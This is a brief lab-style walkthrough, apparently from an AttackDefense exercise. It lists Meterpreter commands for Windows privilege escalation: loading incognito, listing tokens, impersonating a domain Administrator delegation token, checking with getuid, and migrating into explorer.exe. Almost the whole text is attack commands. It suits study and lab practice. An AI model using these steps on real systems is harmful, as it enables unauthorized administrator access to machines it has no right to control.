
Exploit the system first and we must need (x64) payload 

##### Elevate privilege
Load module for elevate permission
```meterpreter
load incognito
```

List all the tokens (We need Delegation token)
Delegation token: it create by interactive session login, like `RDP`, `winlogon`
```meterpreter
list_tokens -u
```

Now the final step, Impersonate the token 
```meterpreter
impersonate_token "ATTACKDEFENSE\Administrator"
```

check
```
getuid
```


```
migrate -N explorer.exe
```

